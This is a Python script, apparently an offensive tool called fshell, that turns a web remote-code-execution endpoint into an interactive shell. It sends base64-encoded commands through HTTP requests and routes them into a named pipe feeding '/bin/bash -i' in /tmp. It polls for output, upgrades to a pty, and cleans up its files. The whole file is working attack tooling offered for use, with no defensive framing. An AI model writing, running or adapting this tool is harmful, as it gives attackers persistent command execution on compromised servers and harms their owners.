#!/usr/bin/env python3
import sys
import os
import requests
from time import sleep
from threading import Thread
from random import randint
from base64 import b64encode
from termcolor import colored

WRITABLE_FOLDER = "/tmp"
BEACONING_DELAY = 0.3
UPGRADE_CMD_DELAY = 2
WTF_CMD = ["env", "pwd", "whoami"]
RCE_URL = os.environ.get("RCE_URL", "http://127.0.0.1:54321/rce.php?cmd=%s")

def execute(cmd, timeout=None, verbose=False):
    if verbose:
        pcmd = colored(cmd, "white", "on_red")
        print("Executing %s" % pcmd)
        if timeout:
            print("Timeout: %s" % timeout)
    encoded = b64encode(cmd.encode()).decode()
    try:
        r = requests.get(RCE_URL % encoded, timeout=timeout)
    except requests.exceptions.Timeout:
        return None
    return r.text.strip()

class GetOutput(Thread):
    def __init__(self, sessid, removeFirstLineBeforePrinting=False):
        super().__init__(name="GetOutput")
        self.sessid = sessid
        self.rflbp = removeFirstLineBeforePrinting
        self.pause = False
        self.stop = False

    def read_output(self):
        out = execute("cat %s/out.%d" % (WRITABLE_FOLDER, self.sessid))
        if out != "":
            execute("echo '' > %s/out.%d" % (WRITABLE_FOLDER, self.sessid))
            return out
        return None

    def run(self):
        while not self.stop:
            while self.pause:
                sleep(0.1)
            out = self.read_output()
            if out:
                if self.rflbp:
                    out = "\n".join(out.split("\n")[1:])
                print("%s " % out, end="", flush=True)
            sleep(BEACONING_DELAY)

class NamedPipe:
    def __init__(self, timeout=3.5):
        self.sessid = randint(1000, 100000)
        self.timeout = timeout

    def create(self):
        execute("mkfifo {F}/in.{id}".format(F=WRITABLE_FOLDER, id=self.sessid))
        cmd = "tail -f {F}/in.{id} | /bin/bash -i > {F}/out.{id} 2>&1".format(F=WRITABLE_FOLDER, id=self.sessid)
        execute(cmd, timeout=self.timeout)

    def clean(self):
        execute("rm -f {F}/in.{id} {F}/out.{id}".format(F=WRITABLE_FOLDER, id=self.sessid))

    def kill_process(self):
        cmd = "kill -9 $(ps aux | grep -E -m1 '(in|out)\\.%s'|awk '{print $2}')" % self.sessid
        execute(cmd)
        sleep(UPGRADE_CMD_DELAY)
        execute(cmd)

class FShell:
    def __init__(self, sessid, output_thread):
        self.sessid = sessid
        self.out = output_thread
        self.base_cmd = "echo {cmd} > {F}/in.{id}"
        self.upgraded = False

    def format_cmd(self, cmd):
        return self.base_cmd.format(cmd=cmd, F=WRITABLE_FOLDER, id=self.sessid)

    def upgrade_shell(self):
        print(colored("[*] Upgrading shell.. (~10 secs)", "green"))
        self.out.pause = True
        execute(self.format_cmd('"python -c \'import pty;pty.spawn(\\"/bin/bash\\")\'"'))
        sleep(UPGRADE_CMD_DELAY * 2)
        execute(self.format_cmd('"export TERM=xterm"'))
        sleep(UPGRADE_CMD_DELAY)
        execute(self.format_cmd('"alias ls=\'ls --color=auto\'"'))
        sleep(UPGRADE_CMD_DELAY)
        execute(self.format_cmd('"alias ll=\'ls -lah\' "'))
        sleep(UPGRADE_CMD_DELAY)
        self.out.pause = False
        self.upgraded = True

    def run(self):
        while True:
            try:
                raw_cmd = input()
            except (EOFError, KeyboardInterrupt):
                print("\nUse 'exit_shell' to quit!")
                continue
            if not raw_cmd:
                continue
            elif raw_cmd == "exit_shell":
                print("Closing FShell!")
                break
            elif raw_cmd == "upgrade_shell":
                if not self.upgraded:
                    self.upgrade_shell()
                else:
                    print(colored("[!] Already upgraded!", "red"))
                continue
            elif raw_cmd == "get_sessid":
                print(colored("FShell sessid %d" % self.sessid, "red"))
                continue
            elif raw_cmd == "help_shell":
                print("  get_sessid | upgrade_shell | exit_shell")
                continue
            elif raw_cmd not in WTF_CMD:
                raw_cmd = '"%s"' % raw_cmd
            execute(self.format_cmd(raw_cmd))
            sleep(0.2)
        self.close_shell()

    def close_shell(self):
        self.out.stop = True
        if self.upgraded:
            execute(self.format_cmd("exit ;"))
            sleep(UPGRADE_CMD_DELAY)
            execute(self.format_cmd("exit"))
            sleep(UPGRADE_CMD_DELAY)
        execute(self.format_cmd("exit ;"))

    def ps1(self):
        print("$> ", end="", flush=True)

def rce_check():
    data = "He<>&|00"
    out = execute('echo "%s"' % data)
    return out == data

def advertise():
    w1 = "WARNING: If no response, add space/semi-colon at the end of your command."
    w2 = "  Eg. 'cat /etc/passwd' --> 'cat /etc/passwd ;'"
    msg = "Use '%s' to get an interactive tty" % colored("upgrade_shell", "red")
    print(colored(w1, "white", "on_red"))
    print(colored(w2, "white", "on_red"))
    print("\n%s\n" % msg)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 fshell.py <rce_url>")
        sys.exit(1)
    url = sys.argv[1]
    if "?cmd=" not in url:
        url = url.rstrip("/") + "/rce.php?cmd=%s"
    global RCE_URL
    RCE_URL = url
    advertise()
    if not rce_check():
        print(colored("[!] RCE check failed!", "red"))
        sys.exit(1)
    np = NamedPipe()
    print("Creating Named Pipe (%d)..." % np.sessid)
    np.create()
    print("Created!")
    execute("echo id > {F}/in.{id}".format(F=WRITABLE_FOLDER, id=np.sessid))
    out = GetOutput(np.sessid)
    out.start()
    shell = FShell(np.sessid, out)
    shell.run()
    print("Killing loop process!")
    np.kill_process()
    print("Cleaning session files...")
    np.clean()
    while out.is_alive():
        sleep(1)

    print("See you soon!")
